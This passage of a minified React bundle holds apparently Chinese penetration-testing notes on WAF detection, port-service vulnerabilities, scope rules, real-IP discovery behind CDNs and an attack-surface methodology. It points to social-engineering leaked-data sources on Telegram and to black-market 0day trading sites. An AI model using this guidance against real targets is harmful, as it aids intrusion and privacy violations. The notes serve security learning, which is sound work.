WAF",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u5F88\u591A \u5173\u4E8EWAF \u7684\u7F51\u7AD9"),u.a.createElement("li",null,"Waf \u4F1A\u6709\u4E00\u4E2A X-Powered-By:WAF\u3002 \u4E0D\u662F\u901A\u7528\u7684\uFF0C\u53EA\u662F\u90E8\u5206 \u6709\u8FD9\u6837\u4E00\u4E2A\u8868\u73B0")),"\u4F7F\u7528")}]}]};var w=function i(){Object(t.a)(this,i)};w.\u5E94\u7528\u9762=function(){var i={name:"\u7528\u6237\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},f={name:"\u5BA2\u6237_\u4F1A\u5458_\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},P={name:"\u6298\u6263\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},D={name:"\u8425\u9500\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},C={name:"\u8BA2\u5355\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},M={name:"\u4EA7\u54C1\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},L={name:"\u77ED\u4FE1\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},J={name:"\u652F\u4ED8\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},q={name:"\u5E94\u7528\u9762",steps:[i,f,P,D,C,M,L,J]};return{\u7528\u6237\u7BA1\u7406:i,\u5BA2\u6237_\u4F1A\u5458_\u7BA1\u7406:f,\u6298\u6263\u7BA1\u7406:P,\u8425\u9500\u7BA1\u7406:D,\u8BA2\u5355\u7BA1\u7406:C,\u4EA7\u54C1\u7BA1\u7406:M,\u77ED\u4FE1\u7BA1\u7406:L,\u652F\u4ED8\u7BA1\u7406:J,\u603B\u548C:q}}();var a=function i(){Object(t.a)(this,i)};a.\u4FEE\u590D={\u6253\u597D\u8865\u4E01:u.a.createElement(u.a.Fragment,null,"\u6253\u597D\u8865\u4E01"),\u5173\u95ED\u5165\u53E3:u.a.createElement(u.a.Fragment,null,"\u5173\u95ED\u5165\u53E3"),\u7248\u672C\u5347\u7EA7:u.a.createElement(u.a.Fragment,null,"\u7248\u672C\u5347\u7EA7"),"\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528":u.a.createElement(u.a.Fragment,null,"\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"hvv\uFF0C\u84DD\u961F\uFF0C\u4E00\u4E9B\u5E94\u7528")))};var B=function i(){Object(t.a)(this,i)};B.\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E={name:"\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E",tags:[p.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],content:u.a.createElement(u.a.Fragment,null,"\u5728 \u5C0F\u8FEA \u7684\u624B\u4E0A\uFF0C\u6709\u8FD9\u6837\u4E00\u5F20 PDF \u3002")},B.\u7AEF\u53E3\u670D\u52A1_\u5E38\u7528\u6F0F\u6D1E={name:"\u7AEF\u53E3\u670D\u52A1_\u5E38\u7528\u6F0F\u6D1E",tags:[p.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u548C\u3010\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E\u3011\u57FA\u672C\u76F8\u4F3C\uFF0C\u5728\u3010\u6F0F\u6D1E\u53D1\u73B0-API\u63A5\u53E3\u670D\u52A1\u3011\u4E00\u8BFE"),u.a.createElement("li",null,"\u5168\u90E8\u90FD\u5E26\u6709\u3010\u81EA\u8EAB\u7AEF\u53E3\u3011"),u.a.createElement("li",null,"\u800C\u4E14\uFF0C\u6211\u4E4B\u524D\uFF0C\u4E5F\u505A\u8FC7\u4E00\u4E2A\u548C\u8FD9\uFF0C\u5F02\u66F2\u540C\u5DE5\u7684\uFF01\uFF01\uFF01\u3010PortInfo\u3011\u5DE5\u5177\uFF01\uFF01\uFF01")),"\u6216\u8005\uFF0C\u505A\u4E2A\uFF08\u8D85\u94FE\u63A5\uFF09\u53BB\u7FFB\u67E5\uFF0C\u4E5F\u662F\u53EF\u4EE5\u7684\u53E6\u4E00\u79CD\u65B9\u5F0F",u.a.createElement("br",null),"\u6216\u8005\uFF0C\u4E24\u79CD\u65B9\u5F0F\u4E00\u8D77\uFF0C\u90FD\u8FDB\u884C\u4FDD\u7559\uFF08\u7A0B\u5E8F\u7684\u65B9\u5F0F\uFF0C\u66F4\u52A0\u7075\u6D3B\u51C6\u786E\u3001\u53EF\u7F16\u7A0B\uFF09"),steps:[{name:"WEB\u670D\u52A1\u7C7B",steps:[{name:"Tomcat"},{name:"JBoss/WildFly"},{name:"WebLogic"},{name:"WebSphere"},{name:"GlassFish"},{name:"Jetty"},{name:"Apache"},{name:"IIS"},{name:"Resin"},{name:"Nginx"}]},{name:"\u6570\u636E\u5E93\u7C7B",steps:[{name:"MySql"},{name:"MsSql"},{name:"Oracle"},{name:"Redis"},{name:"PostgreSql"},{name:"Sybase"},{name:"MemCache"},{name:"ElasticSearch"},{name:"DB2"}]},{name:"\u5927\u6570\u636E\u7C7B",steps:[{name:"Hadoop"},{name:"ZooKeeper"}]},{name:"\u6587\u4EF6\u5171\u4EAB",steps:[{name:"FTP"},{name:"NFS"},{name:"Samba"},{name:"LDAP"}]},{name:"\u8FDC\u7A0B\u8BBF\u95EE",steps:[{name:"SSH"},{name:"RDP"},{name:"Telnet"},{name:"VNC"},{name:"pcAnyWhere"}]},{name:"\u90AE\u4EF6\u670D\u52A1",steps:[{name:"SMTP"},{name:"POP3"},{name:"IMAP"}]},{name:"\u5176\u4ED6\u670D\u52A1",steps:[{name:"DNS"},{name:"DHCP"},{name:"SNMP"},{name:"RLogin"},{name:"Rsync"},{name:"Zabbix"},{name:"RMI"},{name:"Docker"}]}]};var O=function i(){Object(t.a)(this,i)};O.\u8303\u56F4\u9605\u8BFB_\u5B50\u57DF\u540D\u76F8\u5173={name:"\u8303\u56F4\u9605\u8BFB_\u5B50\u57DF\u540D\u76F8\u5173",tags:[p.\u8303\u56F4\u9605\u8BFB],content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5141\u8BB8\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u60C5\u51B5\u4E00\uFF1A\u660E\u786E\u5199\u4E86\u3010*\u3011\uFF0C\u5B50\u57DF\u540D\u90FD\u53EF\u4EE5"),u.a.createElement("li",null,"\u60C5\u51B5\u4E8C\uFF1A\u7ED9\u4E86\u4E24\u4E2A\u57DF\u540D\uFF0C\u6CA1\u5199\u4E0D\u5141\u8BB8\u5B50\u57DF\u540D\uFF1B \u90A3\u9ED8\u8BA4\u3010\u5B50\u57DF\u540D\u3011\u90FD\u53EF\u4EE5"))),u.a.createElement("li",null,"\u4E0D\u5141\u8BB8\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u660E\u786E\u5199\u4E86\u3010\u5B50\u57DF\u540D\u4E0D\u53EF\u4EE5\u3011\uFF0C\u90A3\u4E48\u5C31\u4E0D\u53EF\u4EE5")))))},O.\u8303\u56F4\u9605\u8BFB_\u793E\u5DE5\u76F8\u5173={name:"\u8303\u56F4\u9605\u8BFB_\u793E\u5DE5\u76F8\u5173",tags:[p.\u8303\u56F4\u9605\u8BFB],content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u6CA1\u5199\u3010\u4E0D\u5141\u8BB8\u793E\u5DE5\u3011\uFF1B \u90A3\u9ED8\u8BA4\u3010\u793E\u5DE5\u3011\u90FD\u53EF\u4EE5")))};var _=function i(){Object(t.a)(this,i)};_.\u57FA\u672C\u4ECB\u7ECD={name:"\u793E\u5DE5",steps:[O.\u8303\u56F4\u9605\u8BFB_\u793E\u5DE5\u76F8\u5173,{name:"\u5FAE\u4FE1\u516C\u4F17\u53F7"},{name:"QQ\u7FA4",desc:u.a.createElement(u.a.Fragment,null,"\u6BD4\u5982\uFF0C\u641C\u7D22 \u3010\u5951\u7EA6\u9501\u3011")},{name:"\u52A0QQ\u53F7",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")},{name:"TG Telegram",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E0A\u9762\u6709\u793E\u5DE5\u5E93")))}]};var b=function i(){Object(t.a)(this,i)};b.\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9_\u53CA\u6F0F\u6D1E\u5E93={name:"\u5355\u70B9EXP_\u96C6\u4E2D_\u67E5\u8BE2\u7F51\u7AD9",steps:[{name:"\u6F0F\u6D1E\u6587\u5E93\uFF0C\u6536\u5F55\u4E86\u3010\u5E38\u89C1\u6709\u7528POC\u3011\u7684\u5730\u65B9\u3002",desc:u.a.createElement(u.a.Fragment,null,"\u53EF\u4EE5\u901B\u4E00\u901B\uFF0C\u8BF4\u4E0D\u5B9A\u6709\u610F\u5916\u6536\u83B7"),content:u.a.createElement(u.a.Fragment,null,"\u8D44\u6599\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,E("\u767D\u9601\u6587\u5E93","https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ActiveMQ/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/")),u.a.createElement("li",null,E("PeiQi WiKi-POC\u6587\u5E93","http://wiki.peiqi.tech/"))))},{name:"cvedetails",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6BD4\u8F83\u8001\u724C\u7684\uFF0C\u6F0F\u6D1E\u5E93")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",E("www.cvedetails.com/vendor/10048/Nginx.html"),"\u3011")))},{name:"cnvd",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"seebug",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"1337day  /  0day",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"exploit-db",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},{name:"Packetstorm-Security",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))}]},b.\u96F6\u6563_\u590D\u73B0\u6587\u7AE0={name:"\u5355\u70B9EXP_\u96F6\u6563_\u590D\u73B0\u6587\u7AE0",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u641C\u7D22\u5F15\u64CE",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8C37\u6B4C\u3001\u767E\u5EA6"))),u.a.createElement("li",null,"\u5404\u79CD\u8D44\u8BAF\u6765\u6E90",u.a.createElement("ol",null,u.a.createElement("li",null,"GitHub \u641C\u7D22"))),u.a.createElement("li",null,"\u9ED1\u4EA7\u4EA4\u6613",u.a.createElement("ol",null,u.a.createElement("li",null,"0day\u4EA4\u6613\u7F51",u.a.createElement("ol",null,u.a.createElement("li",null,"0day.today"),u.a.createElement("li",null,"Exploit.in"),u.a.createElement("li",null,"ExploitHub.com"),u.a.createElement("li",null,"1337day.com")))))))};var y=function i(){Object(t.a)(this,i)};y.\u6846\u67B6=function(){var i={name:"Yii"},f={name:"Laravel"},P={name:"ThinkPHP"},D={name:"Shiro"},C={name:"Struts"},M={name:"Spring"},L={name:"Maven"},J={name:"Flask"},q={name:"Django"},V={name:"Tornado"};return{\u6846\u67B6_Yii:i,\u6846\u67B6_Laravel:f,\u6846\u67B6_ThinkPHP:P,\u6846\u67B6_Shiro:D,\u6846\u67B6_Struts:C,\u6846\u67B6_Spring:M,\u6846\u67B6_Maven:L,\u6846\u67B6_Flask:J,\u6846\u67B6_Django:q,\u6846\u67B6_Tornado:V}}(),y.\u8BED\u8A00=function(){var i={name:"\u8BED\u8A00_PHP",steps:[y.\u6846\u67B6.\u6846\u67B6_Yii,y.\u6846\u67B6.\u6846\u67B6_Laravel,y.\u6846\u67B6.\u6846\u67B6_ThinkPHP]},f={name:"\u8BED\u8A00_Java",steps:[y.\u6846\u67B6.\u6846\u67B6_Shiro,y.\u6846\u67B6.\u6846\u67B6_Struts,y.\u6846\u67B6.\u6846\u67B6_Spring,y.\u6846\u67B6.\u6846\u67B6_Maven]},P={name:"\u8BED\u8A00_Python",steps:[y.\u6846\u67B6.\u6846\u67B6_Flask,y.\u6846\u67B6.\u6846\u67B6_Django,y.\u6846\u67B6.\u6846\u67B6_Tornado]};return{\u8BED\u8A00_PHP:i,\u8BED\u8A00_Java:f,\u8BED\u8A00_Python:P}}(),y.\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177=function(){var i={name:"\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177_PHP",steps:[c.seay_PHP_\u4EE3\u7801\u5BA1\u8BA1]},f={name:"\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177_\u603B\u548C",steps:[i]};return{\u4EE3\u7801\u5BA1\u8BA1_\u5DE5\u5177_PHP:i,\u603B\u548C:f}}();var j=function i(){Object(t.a)(this,i)};j.Github\u76D1\u63A7={name:"Github\u76D1\u63A7",desc:u.a.createElement(u.a.Fragment,null),content:u.a.createElement(u.a.Fragment,null,"\u4E24\u65B9\u9762\u4F5C\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6536\u96C6\u6700\u65B0\u7684 exp \u6216 poc"),u.a.createElement("li",null,"\u53D1\u73B0\u76F8\u5173 \u6D4B\u8BD5\u76EE\u6807 \u7684\u8D44\u4EA7\u4FE1\u606F",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5982\u679C\u76EE\u6807\u7F51\u7AD9\uFF0C\u7528\u7684\u3010\u67D0\u5957\u7A0B\u5E8F\u3011"),u.a.createElement("li",null,"\u4F60\u53C8\u4E0B\u8F7D\u4E0D\u5230\u8FD9\u5957\u7A0B\u5E8F"),u.a.createElement("li",null,"GitHub\u4E0A\uFF0C\u6709\u4EBA\u53EF\u80FD\u4F1A\u5171\u4EAB\u3010\u8FD9\u5957\u7A0B\u5E8F\u3011")))),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5927\u7684\uFF1A \u2026\u2026\u2026\u2026"),u.a.createElement("li",null,"\u5C0F\u7684\uFF1A \u5C0F\u8FEA\u7684\u5C55\u793A\u811A\u672C",u.a.createElement("ol",null,u.a.createElement("li",null,"\u76D1\u542C\u5173\u952E\u8BCD\uFF1A CVE-2020\u3001ctcms"),u.a.createElement("li",null,"\u6CE8\u518C ",E("Server\u9171","sc.ftqq.com/3.version")," \u63A8\u9001")))))};var v={name:"CDN\u6280\u672F",desc:u.a.createElement(u.a.Fragment,null,"\u8BA9\u7528\u6237\u3010\u5C31\u8FD1\u83B7\u53D6\u3011\u2014\u2014\u2014\u2014\u5BA2\u89C2\u4E0A\uFF0C\u8D77\u5230\u4E86\u3010\u9690\u85CF\u771F\u5B9EIP\u3011\u7684\u4F5C\u7528",u.a.createElement("br",null),"\u53E6\u4E00\u65B9\u9762\u3010\u7F13\u5B58\u3011\uFF0C\u4E5F\u5E72\u6270\u4E86",u.a.createElement("br",null),u.a.createElement("br",null),"\u3010\u771F\u5B9EIP\u3011\u83B7\u53D6\u540E\uFF0C\u4F7F\u7528\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4FEE\u6539\u672C\u5730host\u3002\u7ED1\u5B9A\u6307\u5B9A\u5730\u5740"))),steps:[{name:"\u5B50\u57DF\u540D\u67E5\u8BE2",desc:u.a.createElement(u.a.Fragment,null,"\u7B2C\u4E00\u4E2A\u610F\u4E49",u.a.createElement("br",null),"\u7B2C\u4E8C\u4E2A\u610F\u4E49",u.a.createElement("br",null)),content:u.a.createElement(u.a.Fragment,null,"\u5206\u60C5\u51B5\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"1. \u5B50\u57DF\u540D\uFF0C\u5C31\u5728\u3010\u540C\u673A\u3011"),u.a.createElement("li",null,"2. \u5B50\u57DF\u540D\uFF0C\u5C31\u5728\u3010\u540C\u7F51\u6BB5\u3011"),u.a.createElement("li",null,"3. \u5B50\u57DF\u540D\uFF0C\u4E0D\u5728\u3010\u540C\u7F51\u6BB5\u3011")),"\u5982\u679C\u3010\u5B50\u57DF\u540D\u65E0CDN\u3011\uFF0C\u5219\u6211\u4EEC\u53EF\u4EE5\u63A8\u6D4B\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E3B\u57DF\u540D\u7684\u5927\u81F4IP\u8303\u56F4"),u.a.createElement("li",null,"\u3010\u5B50\u57DF\u540D \u65E0CDN\u3011+\u3010\u5B50\u57DF\u540D \u540C\u7F51\u6BB5\u3011\uFF0C\u5219\u53EF\u4EE5\u80AF\u5B9A\uFF0C\u5927\u81F4\u7F51\u6BB5\u8303\u56F4")),"\u76F8\u5173\u5DE5\u5177\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177"])))},{name:"\u90AE\u4EF6\u670D\u52A1\u67E5\u8BE2",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5927\u4E2D\u578B\u7F51\u7AD9\uFF0C\u90FD\u6709 \u81EA\u5DF1 \u90AE\u4EF6\u670D\u52A1\u5668"),u.a.createElement("li",null,"\u5927\u90E8\u5206\u3010\u90AE\u4EF6\u670D\u52A1\u3011 \uFF0C\u90FD\u4E0D\u4F1A\u505ACDN")),"\u6B63\u5411\u548C\u53CD\u5411",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6211\u4EEC\u53D1\u9001\uFF0C\u4E00\u822C\u4F1A\u8FC7CDN"),u.a.createElement("li",null,"\u5B83\u53D1\u9001\u8FC7\u6765\uFF0C\u4E00\u822C\u4E0D\u8FC7CDN")),"\u64CD\u4F5C",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5148\u6CE8\u518C\uFF0C\u518D\u6536\u90AE\u4EF6"),u.a.createElement("li",null,"\u67E5\u770B\u90AE\u4EF6\u6E90\u7801"),u.a.createElement("li",null,"\u9A8C\u8BC1",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4EBA\u60C5\u5473\u7684"),u.a.createElement("li",null,"\u6280\u672F\u624B\u6BB5")))))},{name:"\u56FD\u5916\u5730\u5740\u8BF7\u6C42",desc:u.a.createElement(u.a.Fragment,null,"\u9009\u62E9\u3010m\u57DF\u540D\u3011\uFF0C\u53EF\u80FD\u6BD4 com\u57DF\u540D \u5BF9\u5E94\u7684CDN\u8282\u70B9\u8981\u5C11\u3002",u.a.createElement("br",null),"\u66F4\u597D\u7B5B\u9009",u.a.createElement("br",null)),steps:[c.\u7EC4.\u8D85\u7EA7Ping,c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3]},{name:"\u9057\u7559\u6587\u4EF6\uFF0C\u626B\u63CF\u5168\u7F51",tags:[p.\u7279\u5B9A\u89E6\u53D1\u6761\u4EF6,p.\u653E\u5230\u6700\u540E\u8003\u8651],steps:[{name:"\u9057\u7559\u6587\u4EF6",content:u.a.createElement(u.a.Fragment,null,"phpinfo",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8BBF\u95EE\u672C\u5730\u5730\u5740"),u.a.createElement("li",null,"\u901A\u8FC7\u3010\u672C\u5730\u5730\u5740\u3011\u770B\u5230\u3010\u771F\u5B9EIP\u3011"),u.a.createElement("li",null,"Server Address")))},{name:"\u626B\u63CF\u5168\u7F51  \uFF08\u6700\u540E\u7684\u529E\u6CD5\uFF09",tags:[p.\u653E\u5230\u6700\u540E\u8003\u8651],content:u.a.createElement(u.a.Fragment,null,"\u5DE5\u5177\u3001\u8F6F\u4EF6\u3001\u5E73\u53F0",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5404\u4E2A\u5730\u533A\uFF0C\u90FD\u6536\u96C6IP"),u.a.createElement("li",null,"\u7136\u540E\uFF0C\u5206\u6790IP")),"\u5E38\u7528\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4["\u3010\u7EC4\u3011CDN\u626B\u5168\u7F51"]),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3)))}]},{name:"\u9ED1\u6697\u5F15\u64CE\uFF0C\u641C\u7D22\u7279\u5B9A\u6587\u4EF6",desc:g.\u9891\u7387\u4ECB\u7ECD,desc_styles:{maxWidth:"500px",width:"500px"},steps:[g.\u7279\u5B9A\u6587\u4EF6]},{name:"DNS\u5386\u53F2\u8BB0\u5F55\uFF0C\u4EE5\u91CF\u6253\u91CF",steps:[{name:"DNS\u5386\u53F2\u8BB0\u5F55",content:u.a.createElement(u.a.Fragment,null,"\u4E4B\u524D\u6CA1\u4F7F\u7528CDN\uFF0C\u6709\u4ED6\u7684\u5386\u53F2\u8BB0\u5F55",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7559\u4E0B\u4E86\u75D5\u8FF9"),u.a.createElement("li",null,"\u4E4B\u524D\u6CA1\u6709\u94B1\uFF0C\u6216\u8005 \u6CA1\u60F3\u5230\u6709CDN\u8FD9\u4E2A\u670D\u52A1")),"\u4ECE \u5386\u53F2\u8BB0\u5F55 \u627E\uFF0C\u4EE5\u524D\u6CA1\u4F7F\u7528 CDN \u65F6\u7684\u771F\u5B9EIP\u3002",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790\u8BB0\u5F55)))},{name:"\u4EE5\u91CF\u6253\u91CF",tags:[p.\u653E\u5230\u6700\u540E\u8003\u8651]}]},c.\u7EC4["\u3010\u7EC4\u3011CDN\u626B\u5168\u7F51"]]},x={name:"\u603B\u4F53\u601D\u8DEF",desc:u.a.createElement(u.a.Fragment,null,"\u628A\u4F60\u7684\u76EE\u6807\uFF0C\u4ED6\u80FD\u591F\u5728\u7F51\u4E0A\u53EF\u4EE5\u6D4B\u8BD5\u7684\u70B9\uFF0C\u5168\u90E8\u627E\u51FA\u6765\uFF1B",u.a.createElement("br",null),"\u5728\u6240\u6709\u53EF\u6D4B\u8BD5\u7684\u70B9\uFF0C\u9009\u53D6\u6700\u8106\u5F31\u7684\u70B9\uFF0C\u8FDB\u53BB\u3002"),steps:[{name:"\u6709\u65E0WEB",steps:[{name:"\u6709\u65E0CDN",desc:u.a.createElement(u.a.Fragment,null,"\u6709\uFF0C\u8DF3\u8F6C\u3010CDN\u3011",u.a.createElement("br",null),"\u65E0\uFF0C\u5F00\u59CB\u3010WEB\u3011",u.a.createElement("br",null))}]},{name:"\u6709\u65E0APP",steps:[{name:"\u662F\u5426 WEB \u534F\u8BAE",desc:u.a.createElement(u.a.Fragment,null,F("\u533A\u5206\u6D4B\u8BD5\u65B9\u6CD5"),u.a.createElement("br",null),u.a.createElement("br",null),u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\uFF0C\u8DF3\u8F6C\u3010\u6709\u65E0WEB\u3011"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u65E0\uFF0C\u8FDB\u884C\u5206\u6790\u3002",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5E76\u5F00\u59CB\u3010APP\u3011"))))),steps:[{name:"\u5C1D\u8BD5\u63D0\u53D6"},{name:"\u53CD\u7F16\u8BD1\u9006\u5411"},{name:"\u82E5\u8FD8\u662F\u65E0WEB",desc:u.a.createElement(u.a.Fragment,null,"\u8DF3\u8F6C\u3010\u6709\u65E0\u5176\u4ED6\u3011")}]}]},{name:"\u6709\u65E0\u5176\u4ED6",steps:[{name:"\u4FA7\u95E8\u4FE1\u606F / \u8D44\u4EA7\u4FE1\u606F",desc:u.a.createElement(u.a.Fragment,null,F("\u4FA7\u95E8\u4FE1\u606F")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u4EE5\u4E0A\u5404\u79CD\u5E73\u53F0\u4FE1\u606F"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"whois\u5907\u6848\u7B49",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u7EC4.\u57DF\u540D["\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49"]))),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"github\u7B49\u76D1\u63A7\u3002 \u53EF\u89C1\u300A\u8D44\u4EA7\u76D1\u63A7 \u62D3\u5C55\u300B",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(j.Github\u76D1\u63A7)))))},{name:"\u7B2C\u4E09\u65B9\u5E94\u7528",desc:u.a.createElement(u.a.Fragment,null,F("\u4ECE\u8FD9\u4E9B\u5165\u624B")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u6570\u636E\u5E93\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"mysql"),u.a.createElement("li",null,"mssql"),u.a.createElement("li",null,"oracle"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026"))),u.a.createElement("li",null,"\u5404\u79CD\u7BA1\u7406\u5E73\u53F0",u.a.createElement("ol",null,u.a.createElement("li",null,"weblogic"),u.a.createElement("li",null,"phpmyadmin"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026"))),u.a.createElement("li",null,"\u5404\u79CD\u7B2C\u4E09\u65B9\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"vsftpd"),u.a.createElement("li",null,"nexus"),u.a.createElement("li",null,"git"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026")))))},{name:"\u5404\u79CD\u670D\u52A1\u63A5\u53E3",desc:u.a.createElement(u.a.Fragment,null,F("\u53D1\u73B0\u66F4\u591A\u672A\u77E5\u7684\u63A5\u53E3\u5C1D\u8BD5")),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5B58\u50A8\u670D\u52A1"),u.a.createElement("li",null,"\u652F\u4ED8\u670D\u52A1"),u.a.createElement("li",null,"\u5185\u90E8\u670D\u52A1"),u.a.createElement("li",null,"\u2026\u2026\u2026\u2026")))},{name:"\u5FAE\u4FE1\u516C\u4F17\u53F7\u7B49",desc:u.a.createElement(u.a.Fragment,null,F("\u53D1\u73B0\u66F4\u591A\u672A\u77E5\u7684\u5E94\u7528"),u.a.createElement("br",null),u.a.createElement("br",null),"(\u516C\u53F8\uFF0C\u505A\u7684\u6BD4\u8F83\u597D\u7684)"),content:u.a.createElement(u.a.Fragment,null,"\u627E \u66F4\u591A\u7684\u5E94\u7528 \u7EE7\u7EED",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6D89\u53CAWEB"),u.a.createElement("li",null,"\u6D89\u53CAAPP"),u.a.createElement("li",null,"\u6D89\u53CA\u5176\u4ED6")))},{name:"\u5185\u90E8\u7FA4  \u5185\u90E8\u5E94\u7528  \u7B49",desc:u.a.createElement(u.a.Fragment,null,F("\u793E\u5DE5 \u6216 